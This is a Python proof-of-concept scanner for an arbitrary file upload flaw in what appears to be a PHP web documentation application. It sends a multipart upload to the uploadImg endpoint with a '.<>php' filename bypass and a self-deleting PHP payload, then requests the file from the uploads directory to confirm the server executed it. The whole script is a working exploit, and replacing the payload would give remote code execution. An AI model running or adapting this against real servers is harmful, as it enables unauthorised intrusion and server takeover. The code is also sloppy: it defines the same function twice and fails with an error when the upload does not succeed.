import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
r11=randomLowercase(4)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
r2=randomLowercase(4)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"index.php?s=/home/page/uploadImg"
	body='''----------------------------835846770881083140190633\r
Content-Disposition: form-data; name="editormd-image-file"; filename="'''+r11+'''.<>php"\r
Content-Type: text/plain\r
\r
<?php echo "'''+r2+'''"; unlink(__FILE__); ?>\r
----------------------------835846770881083140190633--\r
'''
	headers={'Content-Type': 'multipart/form-data; boundary=--------------------------835846770881083140190633'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "success" in response.text:
		r0=True
		date=re.findall("\\d{4}-\\d{2}-\\d{2}",response.text)[0]
		file=re.findall("[a-f0-9]+\\.php",response.text)[0]

	else:
		r0=False
	url=baseurl+f"Public/Uploads/{date}/{file}"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and r2 in response.text:
		r1=True
	else:
		r1=False
	if r0 and r1:
		return True
	else:
		return False
